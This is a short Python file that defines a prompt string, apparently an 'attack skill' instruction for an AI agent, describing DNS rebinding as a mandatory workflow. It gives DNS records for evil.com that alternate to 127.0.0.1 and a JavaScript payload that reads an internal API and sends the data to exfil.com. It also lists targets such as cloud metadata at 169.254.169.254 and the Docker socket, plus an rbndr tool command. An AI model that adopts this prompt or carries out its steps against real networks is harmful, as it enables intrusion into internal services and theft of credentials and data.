"""
DNS Rebinding Attack Skill Prompt.
"""

DNS_REBINDING_SKILL_PROMPT = """
## ATTACK SKILL: DNS REBINDING

### MANDATORY WORKFLOW

#### STEP 1: SETUP
Configure a domain with short TTL (0-1 second):
```
evil.com. 1 IN A 1.2.3.4      (your server IP)
evil.com. 1 IN A 127.0.0.1    (alternates to internal)
```

#### STEP 2: EXPLOITATION
```html
<!-- Hosted on evil.com -->
<script>
fetch('http://evil.com:8080/internal-api')
  .then(r => r.text())
  .then(d => fetch('https://exfil.com/?d=' + btoa(d)));
</script>
```
→ Browser resolves evil.com → attacker IP (loads page), then resolves evil.com → 127.0.0.1 (attacks internal service).

#### STEP 3: TARGETS
- Internal services: `localhost:8080`, `192.168.1.1`
- Cloud metadata: `169.254.169.254`
- Docker daemon: `unix:///var/run/docker.sock` (via port mapping)

#### STEP 4: TOOLS
Use `rbndr` or `singularity` for DNS rebinding:
```bash
python3 rbndr.py --domain evil.com --target 127.0.0.1 --port 8080
```

#### ANTI-PATTERNS: DNS rebinding is niche — only useful when you have code execution in a browser context (XSS, malicious page).
"""
